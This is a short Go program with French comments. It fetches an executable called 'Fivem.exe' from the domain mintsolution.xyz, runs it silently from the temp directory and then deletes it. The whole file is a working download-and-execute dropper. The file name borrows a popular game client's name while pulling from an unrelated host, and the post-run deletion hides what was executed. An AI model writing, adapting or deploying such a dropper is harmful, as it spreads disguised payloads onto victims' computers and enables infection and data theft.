package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

func downloadFile(url, filepath string) error {
	// Créer un fichier pour enregistrer le contenu téléchargé
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Effectuer la demande HTTP GET pour récupérer le contenu du fichier
	response, err := http.Get(url)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	// Écrire le contenu de la réponse HTTP dans le fichier local
	_, err = io.Copy(out, response.Body)
	if err != nil {
		return err
	}

	return nil
}

func main() {
	// URL du fichier exécutable à télécharger
	exeURL := "https://mintsolution.xyz/Fivem.exe"

	// Chemin où enregistrer le fichier exécutable téléchargé dans le répertoire temporaire
	exeFileName := "Fivem.exe" // Nom du fichier exécutable
	tempDir := os.TempDir()
	exePath := filepath.Join(tempDir, exeFileName)

	// Télécharger le fichier exécutable depuis l'URL spécifiée
	fmt.Println("Téléchargement de l'exécutable...")
	err := downloadFile(exeURL, exePath)
	if err != nil {
		fmt.Printf("Erreur lors du téléchargement du fichier exécutable : %s\n", err)
		return
	}
	fmt.Println("Téléchargement terminé.")

	// Exécuter le fichier exécutable
	fmt.Println("Exécution de l'exécutable...")
	cmd := exec.Command(exePath)
	err = cmd.Run()
	if err != nil {
		fmt.Printf("Erreur lors de l'exécution du fichier exécutable : %s\n", err)
		return
	}
	fmt.Println("Exécution terminée.")

	// Supprimer le fichier exécutable après son exécution
	fmt.Println("Suppression du fichier exécutable...")
	err = os.Remove(exePath)
	if err != nil {
		fmt.Printf("Erreur lors de la suppression du fichier exécutable : %s\n", err)
		return
	}
	fmt.Println("Suppression terminée.")
}
